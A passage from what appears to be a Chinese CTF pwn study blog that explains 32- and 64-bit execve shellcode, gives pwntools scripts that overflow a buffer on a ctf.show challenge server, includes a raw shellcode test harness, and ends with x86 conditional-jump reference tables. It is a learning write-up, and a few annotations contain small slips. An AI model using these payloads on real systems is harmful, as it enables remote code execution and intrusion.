table)的命令。该命令会显示出目标文件中涉及到的外部符号的重定位信息<br>重定位表记录了需要在船接或加载过程中修复的位置，以便正确解析外部符号的地址。通过查看重定位表，可以了解到程序中哪些位置需要进行重定位以及涉及的外部<br>readelfS 是一个用于直看目标文件或可执行文件中节(section)信息的命令。它可以显示出目标文件的名个节的详细信息，包括名称大小、偏移量、链接属性等。</p>
+<p><strong>puts遇到’\x00’才停止</strong><br>可辅助打印出函数变量相邻关键信息.（例 没读入puts函数最后一个值导致程序在puts时连带下方紧联系的关键值【用户登录密码】）</p>
+<p><strong>32位shellcode</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805225412511.png" alt="image-20230805225412511"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231715929.png" alt="image-20230805231715929"></p>
+<p>Linux执行execve（“&#x2F;bin&#x2F;sh”,NULL,NULL）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">push</span> <span class="number">0</span>x68</span><br></pre></td></tr></table></figure>
+
+
+<p>将0x68（104）压入栈中，这是为了将后续的字符串”&#x2F;bin&#x2F;sh”放入栈中，以便后续调用.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0x732f2f2f</span></span><br></pre></td></tr></table></figure>
+
+<p>由于x86栈存储为小端序，此步是为了将”&#x2F;bin&#x2F;sh”的前半部分字符逆序压入栈中即”sh&#x2F;&#x2F;“</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0x6e69622f</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来就是后半部分喽（”&#x2F;bin”）</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>，<span class="built_in">esp</span></span><br></pre></td></tr></table></figure>
+
+<p>将”&#x2F;bin&#x2F;sh”起始地址复制给ebx.ebx将作为execve调用的第一个参数，即要执行的可执行文件的路径.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">ecx</span>，<span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>，<span class="built_in">edx</span></span><br></pre></td></tr></table></figure>
+
+<p>^操作将ecx和ebx置为0，目的就是将此俩寄存器作为调用的第二个和第三个参数，即命令行参数和环境变量.（0-&gt;NULL 无此两变量）</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0xB</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebx</span></span><br></pre></td></tr></table></figure>
+
+<p>将值11（0xb）压入栈中，弹到eax寄存器中，作为系统调用号（这么方便当然不止这一种喽😀）</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure>
+
+<p>触发中断（前面的种种埋伏（eax，ebx, ecx, edx）就是为了满足系统调用 启动一个新shell）</p>
+<p><strong>64位shellcoede</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231443170.png" alt="image-20230805231443170"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231656076.png" alt="image-20230805231656076"></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>
+
+
+<p>压入rax值 保留 为后续使用</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">rdx</span>，<span class="built_in">rdx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rsi</span>，<span class="built_in">rsi</span></span><br></pre></td></tr></table></figure>
+
+
+<p>将两寄存器置0，作为execve第二个和第三个参数（满足64位调用规则）</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> rbx，<span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>将’bin&#x2F;sh’赋值给rbx</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rbx</span>#<span class="string">&quot;/bin/sh&quot;</span>的地址</span><br></pre></td></tr></table></figure>
+
+<p>给execve（）传调用的第一个参数传递可执行文件路径（“&#x2F;bin&#x2F;sh”）</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rsp</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span></span><br></pre></td></tr></table></figure>
+
+<p>将”&#x2F;bin&#x2F;sh”的地址弹到rdi寄存器 方便execve（）调用</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>，<span class="number">59</span></span><br></pre></td></tr></table></figure>
+
+<p>设置系统调用号</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">syscall</span></span><br></pre></td></tr></table></figure>
+
+<p>触发系统调用</p>
+<p><strong>注意</strong> 寄存器值的设置 x86（eax，ebx，ecx，edx）  x64（rax，rdi，rsi，rdx）</p>
+<p><strong>小坑记录</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806182846402.png" alt="image-20230806182846402"></p>
+<p>​                  开PIE 地址随机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806183003512.png" alt="image-20230806183003512"></p>
+<p>NX没打开查看也没有后门 初想法是直接利用gets然后返回到v4（利用pwntolls生成的shellcoede传入v4地址） </p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">got = <span class="built_in">int</span>(got,<span class="number">16</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(got) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>写的时候忘记recvuntil（’]’,drop &#x3D; True）略略略w</p>
+<p>发现EOF 感觉思路没问题 查看汇编和动调</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806183655150.png" alt="image-20230806183655150"></p>
+<p>gets（v4）后有leave retn指令–&gt;相当于mov rbp,rsp  pop rbp retn 占用了24个字节 因此我们不能使用v4后面的24bytes</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806184829072.png" alt="image-20230806184829072"></p>
+<p>生成的shellcode对rsp进行了其他操作所以v4后的8bytes也不能存放.</p>
+<p>修正后的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">got = <span class="built_in">int</span>(got,<span class="number">16</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(got + <span class="number">24</span> +<span class="number">8</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取shellcode的几种方法</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/237300.html">https://www.freebuf.com/articles/system/237300.html</a></p>
+<p>使用read（）–&gt;限制shellcode长度 <strong>注意计算shellcode长度</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807113729341.png" alt="image-20230807113729341"></p>
+<p>PIE打开 地址随机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807114028427.png" alt="image-20230807114028427"></p>
+<p>read限制输入0x38（36）大小  buf可分配大小为0x10 在read处存在明显溢出 偏移为0x10+8（24） 因此shellcode大小必在24内（更短的也类似计算）<br>？ 遇到shellcode长度计算为23  buf_addr + 32大小开始注入<br>（整字节注入喽 小了不够 大了覆盖其他区域出错）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">global _start</span></span><br><span class="line"><span class="comment">section .text</span></span><br><span class="line"><span class="comment">_start:</span></span><br><span class="line"><span class="comment">	push 59</span></span><br><span class="line"><span class="comment">	pop rax</span></span><br><span class="line"><span class="comment">	cdq</span></span><br><span class="line"><span class="comment">	push rdx</span></span><br><span class="line"><span class="comment">	mov rbx,0x68732f6e69622f2f</span></span><br><span class="line"><span class="comment">	push rbx</span></span><br><span class="line"><span class="comment">	push rsp</span></span><br><span class="line"><span class="comment">	pop rdi</span></span><br><span class="line"><span class="comment">	push rdx</span></span><br><span class="line"><span class="comment">	push rdi</span></span><br><span class="line"><span class="comment">	push rsp</span></span><br><span class="line"><span class="comment">	pop rsi</span></span><br><span class="line"><span class="comment">	syscall</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> code[] = <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span>;</span><br><span class="line"><span class="comment">// char code[] = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len:%d bytes\n&quot;</span>, <span class="built_in">strlen</span>(code));</span><br><span class="line">    (*(<span class="type">void</span>(*)()) code)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">           </span><br></pre></td></tr></table></figure>
+
+<p> 有限shellcode 获取网站<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/43550">https://www.exploit-db.com/shellcodes/43550</a></p>
+<p><strong>有时开启某种保护不代表这条路不通</strong><br>                     <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807120842290.png" alt="image-20230807120842290">  </p>
+<p>NX打开 真的不可自行写入吗？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807120907096.png" alt="image-20230807120907096"></p>
+<p>无后门 但buf用mmap分配一块连续的内存空间（1024） 具有可读可写可执行权限（7） 可直接在这里传入shellcode拿到shell （buf用mmap映射了地址）</p>
+<p>FULL RELRO<br>PIE enable</p>
+<p>看汇编（好长一串啊 烦烦烦 静下心慢慢看噜 谁让我这么菜捏ww）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807141728617.png" alt="image-20230807141728617"></p>
+<p>这就是主函数吗！<br>🏀筐 read（0，buf，0x400）<br>🌈框 判读读入var长度，如果&gt;0条跳转至loc_11AC,&lt;&#x3D;跳转至locret_1254</p>
+<p><strong>loc_11AC</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807142146306.png" alt="image-20230807142146306"></p>
+<p>将rbp+var_4的位置置为0，然后跳转置loc_123A</p>
+<p><strong>loc_123A</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807142343645.png" alt="image-20230807142343645"></p>
+<p>如果0&lt;输入参数长度，跳转至loc_11B8，失败则call字符串地址执行，即写入shellcode</p>
+<p><strong>loc_11B8</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807143139655.png" alt="image-20230807143139655"><br>cdqe使用eax的最高位拓展rax高32位的所有位<br>movzx按照无符号类型传送+扩展（16-32）<br>eax是32位寄存器，ax是eax的低16位，ah是ax的高8位，而al是ax的低8位<br>上述大致意思是将我们输入字符串的每一位进行比较，如果不在0x60-0x7A范围内就跳转，loc_11DA和loc_1236就是范围（均是&lt;&#x3D;跳转）</p>
+<hr>
+<p><strong>补充</strong></p>
+<p>汇编语言中条件转移语句：JL&#x2F;JNGE， 用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B0/6597563?fromModule=lemma_inlink">有符号数</a>的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4/15283661?fromModule=lemma_inlink">条件转移指令</a>，小于\不大于且不等于转移；ZF&#x3D;0，且SF⊕OF&#x3D;1。</p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F/298210?fromModule=lemma_inlink">汇编程序</a>设计中jl是一个条件<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4/56285320?fromModule=lemma_inlink">跳转指令</a>，全名jump less，意为小于跳转，数比较类似的还有还有jg、ja、jb等jg jump great 有符号数大于跳转，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B0/6597435?fromModule=lemma_inlink">无符号数</a>比较ja above 大于，jb below 小于，无符号数比较条件跳转根据的是标志位，条件跳转语句前面一般都有一些对标志位有影响的语句，如cmp ，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/test/10804276?fromModule=lemma_inlink">test</a> ，sub等</p>
+<p>86 指令集包含大量的条件跳转指令。它们能比较有符号和无符号整数，并根据单个 CPU 标志位的值来执行操作。条件跳转指令可以分为四个类型：</p>
+<ul>
+<li>基于特定标志位的值跳转</li>
+<li>基于两数是否相等，或是否等于（E）CX 的值跳转</li>
+<li>基于无符号操作数的比较跳转</li>
+<li>基于有符号操作数的比较跳转</li>
+</ul>
+<p>下表展示了基于零标志位、进位标志位、溢出标志位、奇偶标志位和符号标志位的跳转。</p>
+<table>
+<thead>
+<tr>
+<th>助记符</th>
+<th>说明</th>
+<th>标志位&#x2F;寄存器</th>
+<th>助记符</th>
+<th>说明</th>
+<th>标志位&#x2F;寄存器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JZ</td>
+<td>为零跳转</td>
+<td>ZF&#x3D;1</td>
+<td>JNO</td>
+<td>无溢出跳转</td>
+<td>OF&#x3D;0</td>
+</tr>
+<tr>
+<td>JNZ</td>
+<td>非零跳转</td>
+<td>ZF&#x3D;0</td>
+<td>JS</td>
+<td>有符号跳转</td>
+<td>SF&#x3D;1</td>
+</tr>
+<tr>
+<td>JC</td>
+<td>进位跳转</td>
+<td>CF&#x3D;1</td>
+<td>JNS</td>
+<td>无符号跳转</td>
+<td>SF&#x3D;0</td>
+</tr>
+<tr>
+<td>JNC</td>
+<td>无进位跳转</td>
+<td>CF&#x3D;0</td>
+<td>JP</td>
+<td>偶校验跳转</td>
+<td>PF&#x3D;1</td>
+</tr>
+<tr>
+<td>JO</td>
+<td>溢出跳转</td>
+<td>OF&#x3D;1</td>
+<td>JNP</td>
+<td>奇校验跳转</td>
+<td>PF&#x3D;0</td>
+</tr>
+</tbody></table>
+<h4 id="1-相等性的比较"><a href="#1-相等性的比较" class="headerlink" title="1) 相等性的比较"></a>1) 相等性的比较</h4><p>下表列出了基于相等性评估的跳转指令。有些情况下，进行比较的是两个操作数；其他情况下，则是基于 CX、ECX 或 RCX 的值进行跳转。表中符号 leftOp 和 rightOp 分别指的是 CMP 指令中的左（目的）操作数和右（源）操 作数：</p>
+<table>
+<thead>
+<tr>
+<th>助记符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JE</td>
+<td>相等跳转 (leftOp&#x3D;rightOp)</td>
+</tr>
+<tr>
+<td>JNE</td>
+<td>不相等跳转 (leftOp M rightOp)</td>
+</tr>
+<tr>
+<td>JCXZ</td>
+<td>CX&#x3D;0 跳转</td>
+</tr>
+<tr>
+<td>JECXZ</td>
+<td>ECX&#x3D;0 跳转</td>
+</tr>
+<tr>
+<td>JRCXZ</td>
+<td>RCX&#x3D;0 跳转（64 位模式）</td>
+</tr>
+</tbody></table>
+<p>CMP leftOp,rightOp</p>
+<p>操作数名字反映了代数中关系运算符的操作数顺序。比如，表达式 X&lt; Y 中，X 被称为 leftOp，Y 被称为 rightOp。</p>
+<p>尽管 JE 指令相当于 JZ（为零跳转），JNE 指令相当于 JNZ（非零跳转），但是，最好是选择最能表明编程意图的助记符（JE 或 JZ），以便说明是比较两个操作数还是检查特定的状态标志位。</p>
+<p>下述示例使用了 JE、JNE、JCXZ 和 JECXZ 指令。仔细阅读注释，以保证理解为什么条件跳转得以实现（或不实现）。</p>
+<p>示例 1：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0A523h</span></span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">edx</span>, <span class="number">0A523h</span></span><br><span class="line"><span class="keyword">jne</span> L5            <span class="comment">;不发生跳转</span></span><br><span class="line"><span class="keyword">je</span> L1             <span class="comment">;跳转</span></span><br></pre></td></tr></table></figure>
+
+<p>示例 2：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">1234h</span></span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">bx</span>,<span class="number">1234h</span></span><br><span class="line"><span class="keyword">jne</span> L5            <span class="comment">;不发生跳转</span></span><br><span class="line"><span class="keyword">je</span> L1             <span class="comment">;跳转</span></span><br></pre></td></tr></table></figure>
+
+<p>示例 3：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="keyword">ex</span>, 0FFFFh</span><br><span class="line">inc <span class="keyword">ex</span></span><br><span class="line">jexz L2           ;跳转</span><br></pre></td></tr></table></figure>
+
+<p>示例4：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor </span>ecx,ecx</span><br><span class="line"><span class="keyword">jeexz </span>L2          <span class="comment">;跳转</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-无符号数比较"><a href="#2-无符号数比较" class="headerlink" title="2) 无符号数比较"></a>2) 无符号数比较</h4><p>基于无符号数比较的跳转如下表所示。操作数的名称反映了表达式中操作数的顺序（比如 leftOp &lt; rightOp）。下表中的跳转仅在比较无符号数值时才有意义。有符号操作数使用不同的跳转指令。</p>
+<table>
+<thead>
+<tr>
+<th>助记符</th>
+<th>说明</th>
+<th>助记符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JA</td>
+<td>大于跳转（若 leftOp &gt; rightOp）</td>
+<td>JB</td>
+<td>小于跳转（若 leftOp &lt; rightOp）</td>
+</tr>
+<tr>
+<td>JNBE</td>
+<td>不小于或等于跳转（与 JA 相同）</td>
+<td>JNAE</td>
+<td>不大于或等于跳转（与 JB 相同）</td>
+</tr>
+<tr>
+<td>JAE</td>
+<td>大于或等于跳转（若 leftOp ≥ rightOp）</td>
+<td>JBE</td>
+<td>小于或等于跳转（若 leftOp ≤ rightOp）</td>
+</tr>
+<tr>
+<td>JNB</td>
+<td>不小于跳转（与 JAE 相同）</td>
+<td>JNA</td>
+<td>不大于跳转（与 JBE 相同）</td>
+</tr>
+</tbody></table>
+<h4 id="3-有符号数比较"><a href="#3-有符号数比较" class="headerlink" title="3) 有符号数比较"></a>3) 有符号数比较</h4><p>下表列岀了基于有符号数比较的跳转。下面的指令序列展示了两个有符号数值的比较：</p>
+<table>
+<thead>
+<tr>
+<th>助记符</th>
+<th>说明</th>
+<th>助记符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JG</td>
+<td>大于跳转（若 leftOp &gt; rightOp）</td>
+<td>JL</td>
+<td>小于跳转（若 leftOp &lt; rightOp）</td>
+</tr>
+<tr>
+<td>JNLE</td>
+<td>不小于或等于跳转（与 JG 相同）</td>
+<td>JNGE</td>
+<td>不大于或等于跳转（与 JL 相同）</td>
+</tr>
+<tr>
+<td>JGE</td>
+<td>大于或等于跳转（若 leftOp ≥ rightOp）</td>
+<td>JLE</td>
+<td>小于或等于跳转（若 leftOp ≤ rightOp）</td>
+</tr>
+<tr>
+<td>JNL</td>
+<td>不小于跳转（与 JGE 相同）</td>
+<td>JNG</td>
+<td>不大于跳转（与 JLE 相同）</td>
+</tr>
+</tbody></table>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> al, +<span class="number">127</span>       ;十六进制数值 <span class="number">7</span>Fh</span><br><span class="line"><span class="attribute">cmp</span> al, -<span class="number">128</span>       ;十六进制数值 <span class="number">80</span>h</span><br><span class="line"><span class="attribute">ja</span> Is Above        ;不跳转，因为 <span class="number">7</span>Fh &lt; <span class="number">80</span>h</span><br><span class="line"><span class="attribute">jg</span> IsGreater        ;跳转，因为 +<span class="number">127</span> &gt; -<span class="number">128</span></span><br></pre></td></tr></table></figure>
+
+<p>由于无符号数 7Fh 小于无符号数 80h，因此，为无符号数比较而设计的 JA 指令不发生跳转。另一方面，由于 +127 大于 -128，因此，为有符号数比较而设计的 JG 指令发生跳转。</p>
+<p>对下面的代码示例，阅读注释，以保证理解为什么跳转得以实现（或不实现）：</p>
+<p>示例 1：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> edx,-<span class="number">1</span></span><br><span class="line"><span class="attribute">cmp</span> edx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jnl</span> L5          ;不发生跳转（-<span class="number">1</span> ≥ <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jnle</span> L5         ;不发生跳转（-<span class="number">1</span> &gt; <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jl</span> L1           ;跳转（-<span class="number">1</span> &lt; <span class="number">0</span> 为真）</span><br></pre></td></tr></table></figure>
+
+<p>示例 2：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> bx,+ <span class="number">32</span></span><br><span class="line"><span class="attribute">cmp</span> bx,-<span class="number">35</span></span><br><span class="line"><span class="attribute">jng</span> L5         ;不发生跳转（ + <span class="number">32</span> ≤ -<span class="number">35</span> 为假）</span><br><span class="line"><span class="attribute">jnge</span> L5        ;不发生跳转（ + <span class="number">32</span> &lt; -<span class="number">35</span> 为假）</span><br><span class="line"><span class="attribute">jge</span> L1         ;跳转（ + <span class="number">32</span> ≥ -<span class="number">35</span> 为真）</span><br></pre></td></tr></table></figure>
+
+<p>示例 3：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">cmp</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jg</span> L5           ;不发生跳转（<span class="number">0</span> &gt; <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jnl</span> L1          ;跳转（<span class="number">0</span> ≥ <span class="number">0</span> 为真）</span><br></pre></td></tr></table></figure>
+
+<p>示例 4：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">cmp</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jl</span> L5           ;不发生跳转（<span class="number">0</span> &lt; <span class="number">0</span> 为假）</span><br><span class="line"><span class="attribute">jng</span> L1          ;跳转（<span class="number">0</span> ≤ <span class="number">0</span> 为真）</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>我说又是新盲区（樂）</strong></p>
+<p>NX开 部分RELRO</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811115741786.png" alt="image-20230811115741786"></p>
+<p>buf溢出</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>addr</code>：指定映射的起始地址，0LL 表示让系统选择适当的地址。</li>
+<li><code>length</code>：指定映射区域的长度，4096uLL 表示映射区域的大小为 4096 字节。</li>
+<li><code>prot</code>：指定映射区域的保护方式，7 表示可读、可写和可执行。</li>
+<li><code>flags</code>：指定映射区域的标志，34 表示映射为私有（不与其他进程共享）且延迟分配物理内存。</li>
+<li><code>fd</code>：指定要映射的文件描述符，0 表示没有关联的文件，仅映射匿名内存区域。</li>
+<li><code>offset</code>：指定文件映射的偏移量，0LL 表示从文件的起始位置开始映射。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811115837511.png" alt="image-20230811115837511"></p>
